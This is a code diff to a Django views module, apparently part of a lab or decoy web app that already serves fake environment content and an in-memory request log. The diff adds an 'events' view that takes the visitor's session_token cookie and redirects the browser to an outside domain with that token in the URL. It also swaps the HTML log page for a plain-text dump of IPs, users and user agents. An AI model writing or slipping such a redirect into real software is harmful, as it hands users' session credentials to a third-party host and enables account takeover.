@@ -1,6 +1,6 @@
 import base64
-from html import escape
 from pathlib import Path
+from urllib.parse import urlencode
 
 from django.conf import settings
 from django.contrib.auth import login, logout
@@ -155,69 +155,23 @@ ALLOWED_HOSTS=kivygames.com,www.kivygames.com
     return HttpResponse(fake_env_content, content_type='text/plain; charset=utf-8')
 
 
+def events_view(request):
+    token = request.COOKIES.get('session_token', '')
+    url = 'https://events.kivygames.carameloplayground.win/?' + urlencode({'token': token})
+    return redirect(url)
+
+
 def logs_view(request):
-    entries = list(REQUEST_LOG)
+    lines = []
+    for e in REQUEST_LOG:
+        line = f"{e['time']}  {e['method']:<6} {e['status']}  {e['path']}"
+        if e['is_redirect'] and e['location']:
+            line += f"  ->  {e['location']}"
+        line += f"  | ip={e['ip']} user={e['user']} ua={e['ua']}"
+        lines.append(line)
 
-    if entries:
-        rows = []
-        for e in entries:
-            status = e['status']
-            redirect_to = escape(e['location']) if e['is_redirect'] else '&mdash;'
-            rows.append(
-                '<tr>'
-                f'<td>{escape(e["time"])}</td>'
-                f'<td class="method">{escape(e["method"])}</td>'
-                f'<td class="path">{escape(e["path"])}</td>'
-                f'<td class="status-{str(status)[0]}">{status}</td>'
-                f'<td class="redirect">{redirect_to}</td>'
-                f'<td>{escape(e["ip"])}</td>'
-                f'<td>{escape(e["user"])}</td>'
-                f'<td class="ua">{escape(e["ua"])}</td>'
-                '</tr>'
-            )
-        body = (
-            '<table><thead><tr>'
-            '<th>Hora</th><th>Método</th><th>Caminho</th><th>Status</th>'
-            '<th>Redirect &rarr;</th><th>IP</th><th>Usuário</th><th>User-Agent</th>'
-            '</tr></thead><tbody>' + ''.join(rows) + '</tbody></table>'
-        )
-    else:
-        body = '<p class="empty">Nenhuma requisição registrada ainda. Navegue pela aplicação e volte aqui.</p>'
-
-    html = f"""<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta http-equiv="refresh" content="5">
-    <title>Logs de Requisições</title>
-    <style>
-        body {{ font-family: monospace; background: #0d1117; color: #c9d1d9; margin: 0; padding: 24px; }}
-        h1 {{ color: #58a6ff; font-size: 20px; margin: 0 0 4px; }}
-        .meta {{ color: #8b949e; font-size: 13px; margin-bottom: 16px; }}
-        table {{ width: 100%; border-collapse: collapse; font-size: 13px; }}
-        th, td {{ text-align: left; padding: 6px 10px; border-bottom: 1px solid #21262d; white-space: nowrap; }}
-        th {{ color: #8b949e; text-transform: uppercase; font-size: 11px; letter-spacing: .5px; }}
-        tr:hover {{ background: #161b22; }}
-        td.path, td.ua {{ white-space: normal; word-break: break-all; }}
-        .method {{ font-weight: bold; }}
-        .status-2 {{ color: #3fb950; }}
-        .status-3 {{ color: #d29922; }}
-        .status-4 {{ color: #f85149; }}
-        .status-5 {{ color: #f85149; }}
-        .redirect {{ color: #d29922; }}
-        .empty {{ color: #8b949e; padding: 24px 0; }}
-        a {{ color: #58a6ff; }}
-    </style>
-</head>
-<body>
-    <h1>Logs de Requisições</h1>
-    <p class="meta">{len(entries)} registro(s) em memória (máx. 500) &middot; atualiza a cada 5s &middot; <a href="/logs/">recarregar</a></p>
-    {body}
-</body>
-</html>"""
-
-    return HttpResponse(html)
+    body = ("\n".join(lines) + "\n") if lines else "# nenhuma requisicao registrada ainda\n"
+    return HttpResponse(body, content_type='text/plain; charset=utf-8')
 
 
 def robots_txt_view(request):
